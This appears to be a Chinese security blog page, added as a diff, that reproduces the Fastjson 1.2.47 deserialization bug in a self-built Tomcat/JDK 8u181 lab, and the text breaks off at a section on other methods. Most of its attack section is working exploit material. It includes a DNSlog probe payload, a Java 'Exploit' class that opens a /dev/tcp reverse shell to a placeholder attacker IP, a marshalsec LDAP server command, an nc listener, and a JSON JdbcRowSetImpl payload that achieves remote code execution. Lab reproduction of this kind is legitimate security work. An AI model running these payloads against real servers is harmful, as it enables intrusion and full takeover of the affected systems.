@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x00 前言近期攻防值守期间，发现客户单位仍然存在 Fastjson 反序列化漏洞，时隔多秋该漏洞仍然可以被作为打点的利器，于是本着学习的心态重新学习一遍。 Ox01 环境搭建 Tomcat环境搭建        $下载 tomcat9 archive.apache.org&#x2F;dist&#x2F;tomcat&#x2F;tomcat-9&#x2F;v9.0.27&#x2F;bin&#x2F;apache-tomcat-9.0.27.zip  $">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fastjson-1.2.47漏洞环境搭建及复现">
+<meta property="og:url" content="http://example.com/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="世间闲客·此闲行">
+<meta property="og:description" content="0x00 前言近期攻防值守期间，发现客户单位仍然存在 Fastjson 反序列化漏洞，时隔多秋该漏洞仍然可以被作为打点的利器，于是本着学习的心态重新学习一遍。 Ox01 环境搭建 Tomcat环境搭建        $下载 tomcat9 archive.apache.org&#x2F;dist&#x2F;tomcat&#x2F;tomcat-9&#x2F;v9.0.27&#x2F;bin&#x2F;apache-tomcat-9.0.27.zip  $">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/fastjson-1.2.47/1.png">
+<meta property="og:image" content="http://example.com/images/fastjson-1.2.47/3.png">
+<meta property="og:image" content="http://example.com/images/fastjson-1.2.47/4.png">
+<meta property="og:image" content="http://example.com/images/fastjson-1.2.47/5.png">
+<meta property="og:image" content="http://example.com/images/fastjson-1.2.47/6.png">
+<meta property="og:image" content="http://example.com/images/fastjson-1.2.47/7.png">
+<meta property="og:image" content="http://example.com/images/fastjson-1.2.47/8.png">
+<meta property="og:image" content="http://example.com/images/fastjson-1.2.47/9.png">
+<meta property="og:image" content="http://example.com/images/fastjson-1.2.47/10.png">
+<meta property="og:image" content="http://example.com/images/fastjson-1.2.47/11.png">
+<meta property="og:image" content="http://example.com/images/fastjson-1.2.47/12.png">
+<meta property="og:image" content="http://example.com/images/fastjson-1.2.47/13.png">
+<meta property="og:image" content="http://example.com/images/fastjson-1.2.47/14.png">
+<meta property="og:image" content="http://example.com/images/fastjson-1.2.47/15.png">
+<meta property="og:image" content="http://example.com/images/fastjson-1.2.47/16.png">
+<meta property="og:image" content="http://example.com/images/fastjson-1.2.47/17.png">
+<meta property="og:image" content="http://example.com/images/fastjson-1.2.47/18.png">
+<meta property="og:image" content="http://example.com/images/fastjson-1.2.47/19.png">
+<meta property="article:published_time" content="2022-09-02T15:15:26.000Z">
+<meta property="article:modified_time" content="2023-04-04T15:27:32.000Z">
+<meta property="article:author" content="Funsiooo">
+<meta property="article:tag" content="Fastjson">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/fastjson-1.2.47/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/logo-1.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/logo-1.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo-1.png">
+        
+      
+    
+    <!-- title -->
+    <title>Fastjson-1.2.47漏洞环境搭建及复现</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
+
+<meta name="generator" content="Hexo 5.4.2"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/09/03/Cobaltstrike-%E6%B4%BE%E7%94%9FSMB-Beacon/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/09/02/Log4j2%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/&text=Fastjson-1.2.47漏洞环境搭建及复现"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/&title=Fastjson-1.2.47漏洞环境搭建及复现"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/&is_video=false&description=Fastjson-1.2.47漏洞环境搭建及复现"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Fastjson-1.2.47漏洞环境搭建及复现&body=Check out this article: http://example.com/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/&title=Fastjson-1.2.47漏洞环境搭建及复现"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/&title=Fastjson-1.2.47漏洞环境搭建及复现"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/&title=Fastjson-1.2.47漏洞环境搭建及复现"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/&title=Fastjson-1.2.47漏洞环境搭建及复现"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/&name=Fastjson-1.2.47漏洞环境搭建及复现&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/&t=Fastjson-1.2.47漏洞环境搭建及复现"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ox01-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">Ox01 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">0x02 漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%85%B6%E5%AE%83%E6%96%B9%E6%B3%95"><span class="toc-number">4.</span> <span class="toc-text">0x03 其它方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">5.</span> <span class="toc-text">0x04 参考文章</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E6%9C%AC%E6%96%87%E5%B7%A5%E5%85%B7"><span class="toc-number">6.</span> <span class="toc-text">0x05 本文工具</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Fastjson-1.2.47漏洞环境搭建及复现
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Funsiooo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-09-02T15:15:26.000Z" itemprop="datePublished">2022-09-02</time>
+        
+        (Updated: <time datetime="2023-04-04T15:27:32.000Z" itemprop="dateModified">2023-04-04</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Fastjson/" rel="tag">Fastjson</a>, <a class="tag-link-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>, <a class="tag-link-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/1.png" data-caption="image-20220831181656337"><img src="/../images/fastjson-1.2.47/1.png" alt="image-20220831181656337"></a></p>
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>近期攻防值守期间，发现客户单位仍然存在 Fastjson 反序列化漏洞，时隔多秋该漏洞仍然可以被作为打点的利器，于是本着学习的心态重新学习一遍。</p>
+<h2 id="Ox01-环境搭建"><a href="#Ox01-环境搭建" class="headerlink" title="Ox01 环境搭建"></a>Ox01 环境搭建</h2><blockquote>
+<p>Tomcat环境搭建</p>
+</blockquote>
+<figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span>
+<table>
+<tbody>
+<tr>
+<td class="code">
+<pre>
+<span class="meta prompt_">$</span>下载 tomcat9
+archive.apache.org/dist/tomcat/tomcat-9/v9.0.27/bin/apache-tomcat-9.0.27.zip
+
+<p><span class="meta prompt_">$</span> 将此压缩包复制到linux服务器上，并重命名为tomcat9<br>tar -zxvf apache-tomcat-9.0.27.tar.gz<br>mv &#x2F;apache-tomcat-9.0.27 &#x2F;tomcat9</p>
+<p><span class="meta prompt_">$</span> 授予tomcat9这个文件夹777权限<br>chmod -R 777 &#x2F;tomcat9<br></pre></p>
+</td>
+</tr>
+</tbody>
+</table>
+</figure>
+
+
+<blockquote>
+<p>Java 环境搭建</p>
+</blockquote>
+<figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span>
+<table>
+<tbody>
+<tr>
+<td class="code">
+<pre>
+<span class="meta prompt_">$</span> 下载 java 8u181
+https://mirrors.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz
+
+<p><span class="meta prompt_">$</span> 解压后将 java 文件复制到 &#x2F;usr&#x2F;java 目录下<br>tar -zxvf jdk-8u181-linux-x64.tar.gz<br>mkdir &#x2F;usr&#x2F;java<br>mv jdk1.8.0_181&#x2F; &#x2F;usr&#x2F;java</p>
+<p><span class="meta prompt_">$</span> 配置 java 环境<br>vim &#x2F;etc&#x2F;profile</p>
+<p><span class="meta prompt_">$</span> 配置 java 环境，其中 CATALINA_HOME&#x3D;&#x2F; 本地 tomcat 目录,具体看自身 tomcat9 放置路径在哪<br>export JAVA_HOME&#x3D;&#x2F;usr&#x2F;java&#x2F;jdk1.8.0_181<br>export JRE_HOME&#x3D;&#x2F;usr&#x2F;java&#x2F;jdk1.8.0_181&#x2F;jre<br>export CLASS_PATH&#x3D;.:$JAVA_HOME&#x2F;lib&#x2F;dt.jar:$JAVA_HOME&#x2F;lib&#x2F;tools.jar:$JRE_HOME&#x2F;lib<br>export PATH&#x3D;$PATH:$JAVA_HOME&#x2F;bin:$JRE_HOME&#x2F;bin<br>export CATALINA_HOME&#x3D;&#x2F;tomcat9</p>
+<p><span class="meta prompt_">$</span> 使配置文件生效<br>source &#x2F;etc&#x2F;profile</p>
+<p><span class="meta prompt_">$</span> 查看 java 环境是否生效<br>[root@vultr ~]# java -version<br>java version “1.8.0_181”<br>Java(TM) SE Runtime Environment (build 1.8.0_181-b13)<br>Java HotSpot(TM) 64-Bit Server VM (build 25.181-b13, mixed mode)<br></pre></p>
+</td>
+</tr>
+</tbody>
+</table>
+</figure>
+
+
+<blockquote>
+<p>Fastjson环境部署</p>
+</blockquote>
+<figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span>
+<table>
+<tbody>
+<tr>
+<td class="code">
+<pre>
+<span class="meta prompt_">$</span> fastjson-1.2.47，Web 环境文件下载
+https://pan.baidu.com/s/1C022L851nIkq4zy5hiG_TA&shfl=shareset 提取码: sven
+
+<p><span class="meta prompt_">$</span> 将fastjson.war放置以下目录<br>tomcat9&#x2F;bin</p>
+<p><span class="meta prompt_">$</span> 授予tomcat9这个文件夹777权限<br>chmod -R 777 &#x2F;tomcat9<br></pre></p>
+</td>
+</tr>
+</tbody>
+</table>
+</figure>
+
+
+
+
+<blockquote>
+<p>漏洞环境启动</p>
+</blockquote>
+<p>1、进入 tomcat&#x2F;bin 目录输入以下命令启动环境</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./catalina.sh start</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/3.png" data-caption="image-20220831144348744"><img src="/../images/fastjson-1.2.47/3.png" alt="image-20220831144348744"></a></p>
+<p>2、tomcat服务正常</p>
+<p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/4.png" data-caption="image-20220829113214101"><img src="/../images/fastjson-1.2.47/4.png" alt="image-20220829113214101"></a></p>
+<p>3、出现 Hello Word，fastjson 漏洞环境正常</p>
+<p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/5.png" data-caption="image-20220831144845976"><img src="/../images/fastjson-1.2.47/5.png" alt="image-20220831144845976"></a></p>
+<hr>
+<h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><blockquote>
+<p>手动反弹</p>
+</blockquote>
+<p>1、根据前面的环境部署 JDK 为 8u181，所以使用 LDAP 方式进行漏洞复现，本次复现具体漏洞环境为</p>
+<figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span>
+<table>
+<tbody>
+<tr>
+<td class="code">
+<pre>
+[+] apache-tomcat-9.0.27
+[+] fastsjon-1.2.47
+[+] jdk-8u181
+[+] 两台真实VPS，一台搭建漏洞环境，一台用于反弹shell
+[+] win10攻击机
+</pre>
+</td>
+</tr>
+</tbody>
+</table>
+</figure>
+
+<p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/6.png" data-caption="img"><img src="/../images/fastjson-1.2.47/6.png" alt="img"></a></p>
+<center>【图一】 RMI 与 LDAP 具体支持版本的 JDK 版本</center>
+
+<br>
+
+<p>2、LADP 反弹 shell，测试 fastjson 服务是否正常运行</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;xx&quot;,&quot;age&quot;:&quot;999&quot;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/7.png" data-caption="image-20220831145323940"><img src="/../images/fastjson-1.2.47/7.png" alt="image-20220831145323940"></a></p>
+<p>响应正常，fastsjon服务正常</p>
+<p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/8.png" data-caption="image-20220831204721804"><img src="/../images/fastjson-1.2.47/8.png" alt="image-20220831204721804"></a></p>
+<p>2、利用 DNSlog 进行漏洞探测, POC 如下</p>
+<div class="highlight-wrap" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://dnslog域名&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/9.png" data-caption="image-20220831132648019"><img src="/../images/fastjson-1.2.47/9.png" alt="image-20220831132648019"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/10.png" data-caption="image-20220831132438496"><img src="/../images/fastjson-1.2.47/10.png" alt="image-20220831132438496"></a></p>
+<p>3、反弹shell</p>
+<p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/11.png" data-caption="image-20220831205912490"><img src="/../images/fastjson-1.2.47/11.png" alt="image-20220831205912490"></a></p>
+<p>将以下代码命名为 Exploit.java 编译生成 Exploit.class ,并开启 Python 临时 Web 服务放置恶意类;代码中反弹 shell 中需更改为获取反弹 shell 的 VPS 地址，2333为后续 nc 监听的端口。</p>
+<div class="highlight-wrap" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/反弹shell主机IP/2333;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> p.getInputStream();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/12.png" data-caption="image-20220831150537216"><img src="/../images/fastjson-1.2.47/12.png" alt="image-20220831150537216"></a></p>
+<p>利用 marshalsec 开启 LDAP 服务，2121为 LDAP 服务端口，3333为上一步开启的 python 服务端口</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://恶意class_IP:3333/#Exploit 2121</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/13.png" data-caption="image-20220831150758309"><img src="/../images/fastjson-1.2.47/13.png" alt="image-20220831150758309"></a></p>
+<p>开启 nc 监听，等待反弹 shell</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/14.png" data-caption="image-20220831150855930"><img src="/../images/fastjson-1.2.47/14.png" alt="image-20220831150855930"></a></p>
+<p>Burp 放包，实现反弹 shell，Poc 如下</p>
+<div class="highlight-wrap" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://反弹shell主机IP:2121/Exploit&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/15.png" data-caption="image-20220831134702119"><img src="/../images/fastjson-1.2.47/15.png" alt="image-20220831134702119"></a></p>
+<p>VPS 查看，成功反弹</p>
+<p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/16.png" data-caption="image-20220831210528598"><img src="/../images/fastjson-1.2.47/16.png" alt="image-20220831210528598"></a></p>
+<hr>
+<h2 id="0x03-其它方法"><a href="#0x03-其它方法" class="headerlink" title="0x03 其它方法"></a>0x03 其它方法</h2><blockquote>
+<p>利用 jndi_tool 获取反弹 shell</p>
+</blockquote>
+<p>1、工具下载链接</p>
